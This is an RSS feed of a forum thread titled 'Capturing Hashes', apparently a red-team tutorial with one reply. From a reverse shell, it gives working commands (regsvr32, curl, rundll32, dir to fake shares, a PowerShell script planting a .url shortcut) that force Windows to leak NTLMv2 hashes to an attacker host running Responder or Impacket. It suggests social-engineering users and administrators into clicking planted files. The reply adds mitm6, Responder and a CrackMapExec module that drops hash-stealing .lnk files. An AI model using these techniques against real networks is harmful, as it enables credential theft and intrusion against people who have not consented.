<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Capturing Hashes</title>
    <link>https://0x00sec.org/t/capturing-hashes/21826</link>
    <description>A little from my Blog that I wanted to share here as well.

[*DMCXBLUE*](https://dmcxblue.net)

These examples will be used from a Reverse Shell, as not always we have the great GUI to use when we are in an engagement or simply it’s just not available because of X reason. I will try me best to work with this situation as I as well would love to be capable of running many techniques from just a simple Shell, [ *don’t know why but like it more that way* ].

#### Responder

In the first example I will use an awesome tool called “ ***Responder*** ” a great tool used for Poisoning LLMNR and NBT-NS responses, this cool works great when a user mistakenly mistypes a network share, the reason it works is because when Microsoft can’t find the Network name (DNS) it will fall back to LLMNR and NBT-NS from here responder, Responds to the connection telling the user that “Yes I am [Insert Name Here] and will capture the Ntlmv2 hash used for Authentication here is a sample on how to capture it with your Shell.

Use the “dir” command and try to list an UN-existing share from here Responder will start it’s magic in responding to that UN-existing share.

```
dir \\NotHere\C$
```

![|660x472](upload://yluMGqOr4A8tV5t1FBgRhyZ0neX.png)

Reverse Shell

![|1024x364](upload://AuKiQIoaSEWBb9YyWQTbsah0AZc.png)

#### SMBServer.py

A great tool from Impacket here we can create a fast SMB Server to share files and to Exfiltrate any Loot that we may find on the Network but we are focused in grabbing hashes, so how would this work?, Easy we setup the SMB Server and then we simply connect to it to capture the Hash.

In this example we also need to use the IP Addr of the attacking machine with it’s Share Name that we are trying to access.

```
dir \\&lt;IP ADDR&gt;\Fake-SMB
```

The user will receive an error like this if they ever try to access the Share you have to make sure to add SMB2Support for Compatibility Issues.

![|1024x359](upload://eblCuMYbGGdF9Fvaz4h2wcylYVq.png)

Error Message

![|797x606](upload://63p4986lQd5a7kntEFpMd5yNC56.png)

#### Regsvr32.exe

With this tool we can try and call an unexisting file from our Attacking Machine it will try to communicate and from here as well we will capture the Ntlmv2 Hash.

```
regsvr32.exe /s /u /i://10.0.2.15/@NotExist scrobj.dll
```

![](upload://qVddIVjlNcgmDWij4KXcslEk6Vs.png)

![|1024x356](upload://klT2qtxNNZf93v3h5xGASzPmJnf.gif)

#### ShortCut Links

What about Shortcut Links, make our target thing that they are trying to visit a website but they actually pinged our Machine??, Well since we have a powershell Shell we can create a simple LNK File to do this. We can use the following:

```
$WshShell = New-Object -comObject WScript.Shell
$shortcut = $WshShell.CreateShortcut(&quot;hash.url&quot;)
$shortcut.TargetPath = &quot;file://10.0.2.15/@NOTHERE&quot;
$shortcut.Save()
```

And finally we can just call it from Powershell or wait for Our Target to execute it, we might want to do some SE here and make it like we replaced an LNK of there own.

![](upload://eo6UYGWIcZJeZHcnDgEMhLgdAeZ.png)

Executing

![|1024x356](upload://nn1CmjpY5ZT6nCfpuTmGW267ewT.gif)

#### Curl

Yes as mentioned here, we can use Curl to capture NTLM hashes as well you mostly have to wonder about applications that make network connections as Curl is now integrated in Windows CMD and PowerShell it’s as simple as typing:

```
curl \\10.0.2.15\NOTHERE.txt
```

![](upload://9NNxBINAQP1Fz8AiKQRylp8Cv7d.png)

Responder Ready:

![](upload://pA5GM2TWm4nnp6RIs4Je3ixoICl.png)

![|1024x356](upload://crFdZBw4CIagUWeYmrNuC7AtbiP.gif)

These are just a few techniques, methods which we can utilize from our trusty old ncat Shell and grab some NTLMv2 hashes and the good thing is that we don’t even need to Escalate Privileges we can just leave these files and wait for an Administrator to click them [ *It sometimes happens!* ] and we can capture those hashes as well from here we know how to proceed now we can use any Password Cracker [John, Hashcat, etc] To crack these hashes their are more techniques that are very useful for even catching a Shell [NTLM Relay] but we won’t dive into that I just wanted to demonstrate a few techniques on how to capture some hashes be wary it can be as simple as `rundll32.exe \\10.0.2.15\NOTHERE.txt,entrypoint` . [Another technique not explained] but you get the idea these binaries have network connection’s not just to execute remote files or download but we can capture Hashes as well!.</description>
    
    <lastBuildDate>Thu, 18 Jun 2020 20:35:40 +0000</lastBuildDate>
    <category>Red-Team</category>
    <atom:link href="https://0x00sec.org/t/capturing-hashes/21826.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Capturing Hashes</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/capturing-hashes/21826/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/capturing-hashes/21826/3</link>
        <pubDate>Sat, 17 Oct 2020 16:14:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21826-3</guid>
        <source url="https://0x00sec.org/t/capturing-hashes/21826.rss">Capturing Hashes</source>
      </item>
      <item>
        <title>Capturing Hashes</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This is really dope!</p>
<p>I just used this on an engagement:</p>
<pre><code class="lang-auto">mitm6 -i eth0
responder -I eth0
</code></pre>
<p>I also love using CME w/ Slinky.</p>
<pre><code class="lang-auto">cme smb hosts.txt -u 'username' -p 'pass' -M slinky -o NAME=cache SERVER=yourip
</code></pre>
<p>This will drop .lnk files that will give you hashes when somebody visits that directory!</p>
<p>Mitm6 worked when Responder didn’t because LLMNR poisoning was blocked.</p>
          <p><a href="https://0x00sec.org/t/capturing-hashes/21826/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/capturing-hashes/21826/2</link>
        <pubDate>Thu, 18 Jun 2020 20:35:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21826-2</guid>
        <source url="https://0x00sec.org/t/capturing-hashes/21826.rss">Capturing Hashes</source>
      </item>
      <item>
        <title>Capturing Hashes</title>
        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
        <description><![CDATA[
            <p>A little from my Blog that I wanted to share here as well.</p>
<p><a href="https://dmcxblue.net" rel="noopener nofollow ugc"><em>DMCXBLUE</em></a></p>
<p>These examples will be used from a Reverse Shell, as not always we have the great GUI to use when we are in an engagement or simply it’s just not available because of X reason. I will try me best to work with this situation as I as well would love to be capable of running many techniques from just a simple Shell, [ <em>don’t know why but like it more that way</em> ].</p>
<h4>Responder</h4>
<p>In the first example I will use an awesome tool called “ <em><strong>Responder</strong></em> ” a great tool used for Poisoning LLMNR and NBT-NS responses, this cool works great when a user mistakenly mistypes a network share, the reason it works is because when Microsoft can’t find the Network name (DNS) it will fall back to LLMNR and NBT-NS from here responder, Responds to the connection telling the user that “Yes I am [Insert Name Here] and will capture the Ntlmv2 hash used for Authentication here is a sample on how to capture it with your Shell.</p>
<p>Use the “dir” command and try to list an UN-existing share from here Responder will start it’s magic in responding to that UN-existing share.</p>
<pre><code class="lang-auto">dir \\NotHere\C$
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f0b7fce90d92c96f54a5faa79d91eec189ab184b.png" alt="" data-base62-sha1="yluMGqOr4A8tV5t1FBgRhyZ0neX" width="660" height="472"></p>
<p>Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ffc806197eeac804d08291aa4421b676671a03b2.png" alt="" data-base62-sha1="AuKiQIoaSEWBb9YyWQTbsah0AZc" width="690" height="245"></p>
<h4>SMBServer.py</h4>
<p>A great tool from Impacket here we can create a fast SMB Server to share files and to Exfiltrate any Loot that we may find on the Network but we are focused in grabbing hashes, so how would this work?, Easy we setup the SMB Server and then we simply connect to it to capture the Hash.</p>
<p>In this example we also need to use the IP Addr of the attacking machine with it’s Share Name that we are trying to access.</p>
<pre><code class="lang-auto">dir \\&lt;IP ADDR&gt;\Fake-SMB
</code></pre>
<p>The user will receive an error like this if they ever try to access the Share you have to make sure to add SMB2Support for Compatibility Issues.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6366d92646ea0f60d7a63ab752f8b20c3f048dd0.png" alt="" data-base62-sha1="eblCuMYbGGdF9Fvaz4h2wcylYVq" width="690" height="241"></p>
<p>Error Message</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a6f8efe671ddd15bfb91a426620896a0e73ad0c.png" alt="" data-base62-sha1="63p4986lQd5a7kntEFpMd5yNC56" width="657" height="500"></p>
<h4>Regsvr32.exe</h4>
<p>With this tool we can try and call an unexisting file from our Attacking Machine it will try to communicate and from here as well we will capture the Ntlmv2 Hash.</p>
<pre><code class="lang-auto">regsvr32.exe /s /u /i://10.0.2.15/@NotExist scrobj.dll
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcb02d3eafed7ecc9be7b09ae3f3e9d0d8c5ff42.png" alt="" data-base62-sha1="qVddIVjlNcgmDWij4KXcslEk6Vs" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ea4df6fbbfd2ec0846e3676c780f8e854882cf5.gif" alt="" data-base62-sha1="klT2qtxNNZf93v3h5xGASzPmJnf" width="690" height="239"></p>
<h4>ShortCut Links</h4>
<p>What about Shortcut Links, make our target thing that they are trying to visit a website but they actually pinged our Machine??, Well since we have a powershell Shell we can create a simple LNK File to do this. We can use the following:</p>
<pre><code class="lang-auto">$WshShell = New-Object -comObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("hash.url")
$shortcut.TargetPath = "file://10.0.2.15/@NOTHERE"
$shortcut.Save()
</code></pre>
<p>And finally we can just call it from Powershell or wait for Our Target to execute it, we might want to do some SE here and make it like we replaced an LNK of there own.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64d82f1722ced69c35eb2586b9fcb1ea4bead629.png" alt="" data-base62-sha1="eo6UYGWIcZJeZHcnDgEMhLgdAeZ" width="" height=""></p>
<p>Executing</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3cc5664df248378930f67f3a3508fec3204c897.gif" alt="" data-base62-sha1="nn1CmjpY5ZT6nCfpuTmGW267ewT" width="690" height="239"></p>
<h4>Curl</h4>
<p>Yes as mentioned here, we can use Curl to capture NTLM hashes as well you mostly have to wonder about applications that make network connections as Curl is now integrated in Windows CMD and PowerShell it’s as simple as typing:</p>
<pre><code class="lang-auto">curl \\10.0.2.15\NOTHERE.txt
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/44b4aa5f3244cd723fa546be1faca4e2158f0eab.png" alt="" data-base62-sha1="9NNxBINAQP1Fz8AiKQRylp8Cv7d" width="" height=""></p>
<p>Responder Ready:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b34ac88d498e23648e5d915b5e71fdd5ceffd3c9.png" alt="" data-base62-sha1="pA5GM2TWm4nnp6RIs4Je3ixoICl" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/573aa9d5303ff4dd842ca5fdab45f4770a125ab3.gif" alt="" data-base62-sha1="crFdZBw4CIagUWeYmrNuC7AtbiP" width="690" height="239"></p>
<p>These are just a few techniques, methods which we can utilize from our trusty old ncat Shell and grab some NTLMv2 hashes and the good thing is that we don’t even need to Escalate Privileges we can just leave these files and wait for an Administrator to click them [ <em>It sometimes happens!</em> ] and we can capture those hashes as well from here we know how to proceed now we can use any Password Cracker [John, Hashcat, etc] To crack these hashes their are more techniques that are very useful for even catching a Shell [NTLM Relay] but we won’t dive into that I just wanted to demonstrate a few techniques on how to capture some hashes be wary it can be as simple as <code>rundll32.exe \\10.0.2.15\NOTHERE.txt,entrypoint</code> . [Another technique not explained] but you get the idea these binaries have network connection’s not just to execute remote files or download but we can capture Hashes as well!.</p>
          <p><a href="https://0x00sec.org/t/capturing-hashes/21826/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/capturing-hashes/21826/1</link>
        <pubDate>Thu, 18 Jun 2020 00:07:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21826-1</guid>
        <source url="https://0x00sec.org/t/capturing-hashes/21826.rss">Capturing Hashes</source>
      </item>
  </channel>
</rss>
